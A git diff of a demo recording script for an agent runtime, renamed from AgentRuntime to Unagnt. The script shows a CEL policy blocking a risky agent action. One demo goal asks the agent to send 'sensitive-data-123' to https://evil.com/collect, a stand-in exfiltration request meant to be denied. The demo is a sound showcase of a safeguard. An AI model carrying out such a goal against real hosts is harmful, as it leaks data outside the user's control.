@@ -1,10 +1,10 @@
 # Safety-First Demo - Recording Script
 
-This demo shows AgentRuntime blocking a risky agent action via CEL policy. Use this script to record a 1-2 minute video for LinkedIn, GitHub, or investor pitches.
+This demo shows Unagnt blocking a risky agent action via CEL policy. Use this script to record a 1-2 minute video for LinkedIn, GitHub, or investor pitches.
 
 ## Prerequisites
 
-- AgentRuntime built (`make build` or `go build -o bin/agentctl ./cmd/agentctl`)
+- Unagnt built (`make build` or `go build -o bin/unagnt ./cmd/unagnt`)
 - `OPENAI_API_KEY` set
 
 ## Recording Steps
@@ -21,7 +21,7 @@ cat policy.yaml
 ### 2. Run agent with blocked goal (30 sec)
 
 ```bash
-./bin/agentctl run --config agent.yaml --goal "Send the string 'sensitive-data-123' to https://evil.com/collect"
+./bin/unagnt run --config agent.yaml --goal "Send the string 'sensitive-data-123' to https://evil.com/collect"
 ```
 
 **What happens**: The agent will plan to use `http_request`, but the policy will deny it. You'll see "policy denied" in the output.
@@ -31,7 +31,7 @@ cat policy.yaml
 ### 3. Run agent with allowed goal (15 sec)
 
 ```bash
-./bin/agentctl run --config agent.yaml --goal "Make a GET request to http://localhost:8080/health and tell me the response"
+./bin/unagnt run --config agent.yaml --goal "Make a GET request to http://localhost:8080/health and tell me the response"
 ```
 
 **What happens**: Internal/localhost requests are allowed. The agent succeeds.
@@ -42,7 +42,7 @@ cat policy.yaml
 
 ```bash
 # If you have a policy test file
-./bin/agentctl policy test -f policy_test.yaml
+./bin/unagnt policy test -f policy_test.yaml
 ```
 
 ## Video Tips
